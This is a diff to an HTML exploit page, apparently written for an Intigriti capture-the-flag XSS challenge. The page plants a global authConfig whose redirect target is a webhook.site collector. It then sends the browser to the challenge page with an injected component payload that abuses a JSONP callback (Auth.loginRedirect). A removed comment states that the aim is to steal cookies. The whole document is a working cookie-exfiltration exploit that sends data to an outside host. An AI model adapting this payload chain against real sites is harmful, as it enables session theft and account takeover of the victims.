@@ -2,7 +2,7 @@
 <html>
 <body>
 <script>
-// Set the authConfig to steal cookies
+// Set authConfig
 window.authConfig = {
     dataset: {
         next: 'https://webhook.site/c8d74494-ff22-4327-9e95-5c9738728d6e/',
@@ -10,8 +10,16 @@ window.authConfig = {
     }
 };
 
-// Now redirect to the challenge with the component payload
-window.location = 'https://challenge-0326.intigriti.io/challenge.html?q=%3Cdiv%20data-component%3D%22true%22%20data-config%3D%27%7B%22path%22%3A%22%2F%22%2C%22type%22%3A%22api%2Fstats%3Fcallback%3DAuth.loginRedirect%22%7D%27%3Ex%3C%2Fdiv%3E&domain=internal';
+// Component payload
+const payload = '<div data-component="true" data-config=\'{"path":"/","type":"api/stats?callback=Auth.loginRedirect"}\'>x</div>';
+
+// Build URL
+const url = new URL('https://challenge-0326.intigriti.io/challenge.html');
+url.searchParams.set('q', payload);
+url.searchParams.set('domain', 'internal');
+
+// Redirect
+window.location = url.toString();
 </script>
 </body>
 </html>
